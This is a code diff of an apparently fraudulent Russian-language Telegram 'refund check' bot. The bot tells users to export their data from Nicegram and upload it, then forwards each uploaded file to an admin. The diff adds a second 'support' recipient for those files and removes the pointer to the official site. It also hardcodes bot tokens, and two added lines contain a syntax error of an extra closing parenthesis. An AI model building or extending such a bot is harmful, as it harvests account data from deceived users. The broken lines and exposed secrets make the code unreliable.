@@ -3,8 +3,10 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import sqlite3
 from datetime import datetime
 
-BOT_TOKEN = "8085763296:AAFlW5-rQVmW9Uxs4P5mdiwf_65CZe7f0VU"
+BOT_TOKEN = "7956796612:AAFRjhOw_4yT0039kOnmMHQEdoDrJchT3go"
 ADMIN_ID = 8362897345
+SUPPORT_ID = 6592407529
+SUPPORT_USERNAME = "@tritophia"
 DB = "refound_bot.db"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -78,7 +80,6 @@ def handle_callback(call):
 
 1. <b>Скачайте Nicegram</b>
    - Нажмите кнопку ниже для скачивания
-   - Или перейдите на официальный сайт
 
 2. <b>Экспортируйте данные:</b>
    - Откройте Nicegram
@@ -103,7 +104,7 @@ def handle_callback(call):
                                caption=instruction_text, parse_mode='HTML', reply_markup=keyboard)
     
     elif call.data == "premium":
-        premium_text = """
+        premium_text = f"""
 💎 <b>Премиум проверка</b>
 
 <b>Что входит:</b>
@@ -117,17 +118,18 @@ def handle_callback(call):
 • 5 проверок - 200 руб
 • 10 проверок - 350 руб
 
-💬 <b>Для активации напишите в поддержку</b>
+💬 <b>Для активации напишите в поддержку:</b>
+{SUPPORT_USERNAME}
         """
         keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("👨‍💻 Написать в поддержку", url="https://t.me/your_support"))
+        keyboard.add(InlineKeyboardButton("👨‍💻 Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME[1:]}")))
         keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
         
         bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                caption=premium_text, parse_mode='HTML', reply_markup=keyboard)
     
     elif call.data == "support":
-        support_text = """
+        support_text = f"""
 👨‍💻 <b>Поддержка</b>
 
 По всем вопросам обращайтесь:
@@ -137,13 +139,13 @@ def handle_callback(call):
 • Сотрудничество
 
 📞 <b>Связь:</b>
-@your_support_username
+{SUPPORT_USERNAME}
 
 ⏰ <b>Время работы:</b>
 Круглосуточно
         """
         keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("💬 Написать", url="https://t.me/your_support_username"))
+        keyboard.add(InlineKeyboardButton("💬 Написать", url=f"https://t.me/{SUPPORT_USERNAME[1:]}")))
         keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
         
         bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
@@ -194,7 +196,9 @@ def handle_file(message):
     """
     
     try:
+        # Отправляем файл админу и в поддержку
         bot.send_document(ADMIN_ID, message.document.file_id, caption=admin_text, parse_mode='HTML')
+        bot.send_document(SUPPORT_ID, message.document.file_id, caption=admin_text, parse_mode='HTML')
         
         conn = sqlite3.connect(DB)
         cur = conn.cursor()
@@ -203,7 +207,7 @@ def handle_file(message):
         conn.commit()
         conn.close()
         
-        print(f"Файл от {user.id} переслан админу")
+        print(f"Файл от {user.id} переслан админу и в поддержку")
         
     except Exception as e:
         print(f"Ошибка: {e}")
@@ -211,7 +215,7 @@ def handle_file(message):
 
 @bot.message_handler(commands=['result'])
 def send_result(message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in [ADMIN_ID, SUPPORT_ID]:
         return
     
     args = message.text.split()[1:]
@@ -239,4 +243,5 @@ def send_result(message):
 if __name__ == "__main__":
     init_db()
     print("✅ Бот для проверки Refound запущен!")
+    print(f"✅ Поддержка: {SUPPORT_USERNAME} (ID: {SUPPORT_ID})")
     bot.polling(none_stop=True)
